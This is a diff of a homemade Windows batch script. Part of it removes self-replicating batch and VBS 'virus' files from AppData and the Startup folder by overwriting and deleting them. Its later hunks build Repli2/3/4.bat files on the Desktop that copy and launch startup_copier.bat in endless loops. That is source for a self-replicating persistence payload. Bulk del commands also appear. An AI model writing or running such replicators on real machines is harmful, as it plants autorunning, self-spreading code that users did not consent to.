@@ -1,4 +1,4 @@
-
+@echo off
 
 
 REM Create new bat and vbs files with nothing in them to replace the old ones. The old ones cant be deleted since they self replicate, so replacing them with no code will prevent them any of the files from self replicating. 
@@ -12,53 +12,133 @@ type NUL > C:\Users\%username%\Downloads\mute.vbs
 ECHO bob >> C:\Users\%username%\Downloads\mute.vbs
 type NUL > C:\Users\%username%\Downloads\startup_copier.bat
 ECHO bob >> C:\Users\%username%\Downloads\startup_copier.bat
+type NUL > C:\Users\%username%\Downloads\repli2.bat
+ECHO bob >> C:\Users\%username%\Downloads\repli2.bat
+type NUL > C:\Users\%username%\Downloads\repli3.bat
+ECHO bob >> C:\Users\%username%\Downloads\repli3.bat
+type NUL > C:\Users\%username%\Downloads\repli4.bat
+ECHO bob >> C:\Users\%username%\Downloads\repli4.bat
+
 
 
 
 REM If the old virus files exist, this will replace them with the files from above with bob/nothing in them.
 IF EXIST "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat" (
 	copy /y "C:\Users\%username%\Downloads\startup.bat" 	"C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-	del C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat
 	)
 	ELSE(
 	ECHO hi
 	)
 IF EXIST "C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.bat" (
 	copy /y "C:\Users\%username%\Downloads\msdfmap.bat" 	"C:\Users\%username%\AppData\Roaming\Microsoft"	
-	del C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.bat
 	)
 	ELSE(
 	ECHO hi
 	)
 IF EXIST "C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.vbs" (
 	copy /y "C:\Users\%username%\Downloads\msdfmap.vbs" 	"C:\Users\%username%\AppData\Roaming\Microsoft"	
-	del C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.vbs
 	)
 	ELSE(
 	ECHO hi
 	)
 IF EXIST "C:\Users\%username%\AppData\Roaming\Microsoft\mute.vbs" (
 	copy /y "C:\Users\%username%\Downloads\mute.vbs" 	"C:\Users\%username%\AppData\Roaming\Microsoft"	
-	del C:\Users\%username%\AppData\Roaming\Microsoft\mute.vbs
 	)
 	ELSE(
 	ECHO hi
 	)
 IF EXIST "C:\Users\%username%\AppData\Roaming\System32\startup_copier.bat" (
 	copy /y "C:\Users\%username%\Downloads\startup_copier.bat" 	"C:\Users\%username%\AppData\Roaming\System32"	
-	del C:\Users\%username%\AppData\Roaming\System32\startup_copier.bat
 	)
 	ELSE(
 	ECHO hi
 	)
+IF EXIST "C:\Users\%username%\AppData\Roaming\repli2.bat" (
+	copy /y "C:\Users\%username%\Downloads\repli2.bat" 	"C:\Users\%username%\AppData\Roaming"	
+	)
+	ELSE(
+	ECHO hi
+	)
+IF EXIST "C:\Users\%username%\AppData\Local\repli2.bat" (
+	copy /y "C:\Users\%username%\Downloads\repli2.bat" 	"C:\Users\%username%\AppData\Local"	
+	)
+	ELSE(
+	ECHO hi
+	)
+IF EXIST "C:\Users\%username%\AppData\repli2.bat" (
+	copy /y "C:\Users\%username%\Downloads\repli2.bat" 	"C:\Users\%username%\AppData"	
+	)
+	ELSE(
+	ECHO hi
+	)
+IF EXIST "C:\Users\%username%\AppData\Roaming\repli3.bat" (
+	copy /y "C:\Users\%username%\Downloads\repli3.bat" 	"C:\Users\%username%\AppData\Roaming"	
+	)
+	ELSE(
+	ECHO hi
+	)
+IF EXIST "C:\Users\%username%\AppData\Local\repli3.bat" (
+	copy /y "C:\Users\%username%\Downloads\repli3.bat" 	"C:\Users\%username%\AppData\Local"	
+	)
+	ELSE(
+	ECHO hi
+	)
+IF EXIST "C:\Users\%username%\AppData\repli3.bat" (
+	copy /y "C:\Users\%username%\Downloads\repli3.bat" 	"C:\Users\%username%\AppData"	
+	)
+	ELSE(
+	ECHO hi
+	)
+IF EXIST "C:\Users\%username%\AppData\Roaming\repli4.bat" (
+	copy /y "C:\Users\%username%\Downloads\repli4.bat" 	"C:\Users\%username%\AppData\Roaming"	
+	)
+	ELSE(
+	ECHO hi
+	)
+IF EXIST "C:\Users\%username%\AppData\Local\repli4.bat" (
+	copy /y "C:\Users\%username%\Downloads\repli4.bat" 	"C:\Users\%username%\AppData\Local"	
+	)
+	ELSE(
+	ECHO hi
+	)
+IF EXIST "C:\Users\%username%\AppData\repli4.bat" (
+	copy /y "C:\Users\%username%\Downloads\repli4.bat" 	"C:\Users\%username%\AppData"	
+	)
+	ELSE(
+	ECHO hi
+	)
+	
 
+
+
+	
+	
 
 REM This deletes the old files after they are replaced with nothing/bob. This also deletes the source, in this case the Downloads folder. 	
+del C:\Users\%username%\AppData\Roaming\repli2.bat
+del C:\Users\%username%\AppData\Local\repli2.bat
+del C:\Users\%username%\AppData\repli2.bat
+del C:\Users\%username%\AppData\Roaming\repli3.bat
+del C:\Users\%username%\AppData\Local\repli3.bat
+del C:\Users\%username%\AppData\repli3.bat
+del C:\Users\%username%\AppData\Roaming\repli4.bat
+del C:\Users\%username%\AppData\Local\repli4.bat
+del C:\Users\%username%\AppData\repli4.bat
+del C:\Users\%username%\AppData\Roaming\System32\startup_copier.bat
+del C:\Users\%username%\AppData\Roaming\Microsoft\mute.vbs
+del C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.vbs
+del C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.bat
+del C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat
+
 del C:\Users\%username%\Downloads\msdfmap.bat
 del C:\Users\%username%\Downloads\startup.bat
 del C:\Users\%username%\Downloads\msdfmap.vbs
 del C:\Users\%username%\Downloads\mute.vbs	
 del C:\Users\%username%\Downloads\startup_copier.bat
+del C:\Users\%username%\Downloads\repli4.bat
+del C:\Users\%username%\Downloads\repli2.bat
+del C:\Users\%username%\Downloads\repli3.bat
+
 
 
 
@@ -191,6 +271,7 @@ set rep16=copy /y "C:\Users\%username%\AppData\Roaming\startup_copier.bat" "C:\U
 set rep17=start C:\Users\%username%\AppData\Roaming\System32\startup_copier.bat
 set rep18=)
 set rep19=goto loop3
+ECHO %rep0%  >> C:\Users\%username%\Desktop\Repli2.bat
 ECHO %rep1%  >> C:\Users\%username%\Desktop\Repli2.bat
 ECHO %rep2%  >> C:\Users\%username%\Desktop\Repli2.bat
 ECHO %rep3%  >> C:\Users\%username%\Desktop\Repli2.bat
@@ -246,6 +327,7 @@ set repa16=copy /y "C:\Users\%username%\AppData\Roaming\startup_copier.bat" "C:\
 set repa17=start C:\Users\%username%\AppData\Roaming\System32\startup_copier.bat
 set repa18=)
 set repa19=goto loop4
+ECHO %repa0%  >> C:\Users\%username%\Desktop\Repli3.bat
 ECHO %repa1%  >> C:\Users\%username%\Desktop\Repli3.bat
 ECHO %repa2%  >> C:\Users\%username%\Desktop\Repli3.bat
 ECHO %repa3%  >> C:\Users\%username%\Desktop\Repli3.bat
@@ -304,6 +386,7 @@ set repas16=copy /y "C:\Users\%username%\AppData\Roaming\startup_copier.bat" "C:
 set repas17=start C:\Users\%username%\AppData\Roaming\System32\startup_copier.bat
 set repas18=)
 set repas19=goto loop5
+ECHO %repas0%  >> C:\Users\%username%\Desktop\Repli4.bat
 ECHO %repas1%  >> C:\Users\%username%\Desktop\Repli4.bat
 ECHO %repas2%  >> C:\Users\%username%\Desktop\Repli4.bat
 ECHO %repas3%  >> C:\Users\%username%\Desktop\Repli4.bat
